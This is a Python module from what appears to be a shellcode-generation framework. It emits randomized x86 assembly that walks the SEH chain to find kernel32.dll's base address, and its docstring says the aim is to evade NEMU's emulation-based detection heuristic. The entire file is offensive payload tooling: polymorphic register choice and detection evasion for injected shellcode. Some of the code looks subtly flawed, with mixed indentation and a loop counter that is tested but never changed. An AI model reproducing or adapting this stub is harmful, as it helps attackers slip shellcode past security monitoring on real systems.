#!/usr/bin/python

"""
SEH-walking based kernel32.dll base address resolution evading NEMU's kernel32.dll heuristic
"""

from random import choice

from payload_modules.kernel32.kernel32_base_resolution import kernel32_base_resolution
from arch.core import word_keywords, stackpointer_registers, acc_regs, ctr_regs, src_index_regs, arch_registers, word_loads

class payload_kernel32_seh_walker(kernel32_base_resolution):

	def base_resolution_stub(self, base_reg):
		stackpointer_reg = stackpointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		acc_reg = acc_regs[self.bits]
		ctr_reg = ctr_regs[self.bits]

		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		regs = arch_registers(self.arch, self.bits)
		reg1 = src_index_regs[self.bits]
		reg2 = regs.random_gp_reg(False, [acc_reg, ctr_reg, reg1])

		word_load = word_loads[self.bits]

		variables = {'base_reg': base_reg, 'word_load': word_load, 'acc_reg': acc_reg, 'ctr_reg': ctr_reg, 'stackpointer_reg': stackpointer_reg, 'word_keyword': word_keyword, 'null_instr': null_instr, 'reg1': reg1, 'reg2': reg2}

  		listing = '''
	PUSH {reg1}
	PUSH {ctr_reg}
	PUSH {reg2}

	{null_instr} {reg2}, {reg2}
	NOT {reg2}

	{null_instr} {ctr_reg}, {ctr_reg}
	MOV CL, 0x18 ; image size of ntdll.dll on Windows 7 Ultimate SP1 (ENG), large enough to cover other versions as well
	SHL {ctr_reg}, 16

	; Walk SEH chain until we find a candidate default SEH frame
	MOV {reg1}, {stackpointer_reg}

seh_walking:
	{word_load} ; load (D/Q)WORD from stack
	CMP {acc_reg}, {reg2}	

JNZ seh_walking	

	; Check if the candidate default SEH frame has correct function pointer
	; [reg1-4] now points to 0xFFFFFFFF so if this truly is the last SEH frame
	; [reg1] (SE Handler) should point into ntdll.dll or kernel32.dll and [reg1+20] (return into RtlUserThreadStart) too

	MOV {acc_reg}, {word_keyword} PTR [{reg1}] ; potential SE Handler
	SUB {acc_reg}, {word_keyword} PTR [{reg1} + 16] ; potential return address of top stack frame
	CMP {acc_reg}, {ctr_reg} ; size limit means function pointer candidates have to reside in same image
JA seh_walking ; continue walking
	
	; we now have a candidate
	MOV {acc_reg}, {word_keyword} PTR [{reg1}]

	; work through potential image until we find base address (within size limit to reduce potential false positives)
find_begin:
	; if we didn't find image base within size limit, give up on this candidate and try next
	TEST {ctr_reg}, {ctr_reg}
	JZ seh_walking

	DEC {acc_reg}
	XOR AX, AX 		; page start
	CMP WORD PTR [{acc_reg}], 0x5A4D ; MZ start of PE header
JNZ find_begin

	POP {reg2}
	POP {ctr_reg}
	POP {reg1}
	MOV {base_reg}, {acc_reg}
'''

		return listing.format(**variables)